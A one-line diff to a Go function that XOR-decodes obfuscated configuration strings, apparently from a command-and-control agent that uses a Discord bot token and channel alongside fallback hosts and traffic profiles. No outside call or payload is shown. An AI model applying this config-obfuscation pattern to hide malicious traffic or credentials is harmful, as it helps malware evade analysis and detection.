@@ -55,6 +55,7 @@ func deobfuscateConfig() {
 	customHeaders = xorDecodeString(customHeaders, keyBytes)
 	fallbackHosts = xorDecodeString(fallbackHosts, keyBytes)
 	contentTypes = xorDecodeString(contentTypes, keyBytes)
+	trafficProfile = xorDecodeString(trafficProfile, keyBytes)
 	discordBotToken = xorDecodeString(discordBotToken, keyBytes)
 	discordChannelID = xorDecodeString(discordChannelID, keyBytes)
 	httpxConfig = xorDecodeString(httpxConfig, keyBytes)
